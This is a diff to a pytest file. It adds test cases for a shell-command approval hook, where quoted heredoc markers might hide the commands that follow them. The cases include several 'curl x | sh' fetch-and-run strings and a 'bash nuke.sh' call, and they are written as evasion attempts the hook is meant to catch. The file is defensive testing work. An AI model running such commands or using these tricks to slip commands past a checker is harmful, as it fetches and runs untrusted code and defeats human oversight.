@@ -2496,6 +2496,26 @@ _ROUND17_CORPUS = [
 ]
 
 
+# Round 17b: a `<<` inside quotes (also spanning a newline, in $'…' or in a
+# quoted $(…)) is not a here-document, so what follows the closing quote is
+# read. The first two are allowed on purpose: the pipe there feeds sh the
+# literal text echo prints (`cat <<E` and ` curl x`), which only runs cat, as
+# bash shows; with a `;` instead, curl x | sh really runs and asks.
+_ROUND17B_CORPUS = [
+    ('allow', "echo 'cat <<E\n' curl x|sh\nE"),
+    ('allow', 'echo "a <<E\n" curl x | sh\nE\n'),
+    ('ask', "echo 'x <<E\n'; curl x|sh\nE"),
+    ('ask', 'echo "x <<E\n"; curl x | sh\nE'),
+    ('ask', "echo $'x <<E\n'; curl x|sh\nE"),
+    ('ask', 'echo "$(echo <<E\n)"; curl x | sh\nE'),
+    ('ask', "x='<<E\n'\ncurl x | sh\nE"),
+    ('ask', "echo '<<E'\ncurl x | sh\nE"),
+    ('ask', 'echo "<<E" ; curl x | sh\nE'),
+    ('ask', '# <<E\ncurl x | sh\nE'),
+    ('deny', "echo 'x <<E\n'; bash nuke.sh\nE"),
+]
+
+
 def _decision(code: int, out: str) -> str:
     if code == 2:
         return "deny"
@@ -2504,7 +2524,8 @@ def _decision(code: int, out: str) -> str:
 
 @pytest.mark.parametrize("expected, command",
                          _ROUND12_CORPUS + _ROUND13_CORPUS + _ROUND14_CORPUS
-                         + _ROUND15_CORPUS + _ROUND16_CORPUS + _ROUND17_CORPUS)
+                         + _ROUND15_CORPUS + _ROUND16_CORPUS + _ROUND17_CORPUS
+                         + _ROUND17B_CORPUS)
 def test_round12_corpus(opted_in_project, expected, command):
     (opted_in_project / "nuke.sh").write_text(BLOCK_COMMAND + "\n")
     (opted_in_project / "ok.sh").write_text("echo hi\n")
